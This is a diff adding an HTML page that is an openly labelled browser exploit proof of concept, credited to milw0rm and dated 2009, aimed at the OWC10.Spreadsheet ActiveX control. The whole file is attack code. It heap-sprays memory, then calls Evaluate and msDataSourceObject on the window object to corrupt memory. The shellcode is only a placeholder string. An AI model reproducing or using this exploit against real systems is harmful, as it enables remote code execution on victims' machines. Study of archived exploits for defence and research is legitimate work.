@@ -1,0 +1,44 @@
+<!-- http://en.securitylab.ru/poc/extra/382458.php -->
+<html>
+<body>
+<script language="JavaScript">
+var shellcode = unescape("evil code");
+var array = new Array();
+var ls = 0x81000-(shellcode.length*2);
+var bigblock = unescape("%u0b0c%u0b0C");
+while(bigblock.length<ls/2)
+{bigblock+=bigblock;}
+var lh = bigblock.substring(0,ls/2);
+delete bigblock;
+for(i=0;i<0x99*2;i++) {
+array[i] = lh + lh + shellcode;
+}
+CollectGarbage();
+var obj = new ActiveXObject("OWC10.Spreadsheet");
+e=new Array();
+e.push(1);
+e.push(2);
+e.push(0);
+e.push(window);
+for(i=0;i<e.length;i++){
+for(j=0;j<10;j++){
+try{
+obj.Evaluate(e[i]);
+}
+catch(e)
+{}
+}
+}
+window.status=e[3] +'';
+for(j=0;j<10;j++){
+try{
+obj.msDataSourceObject(e[3]);
+}
+catch(e)
+{}
+}
+</script>
+</body>
+</html> 
+
+# milw0rm.com [2009-07-16]
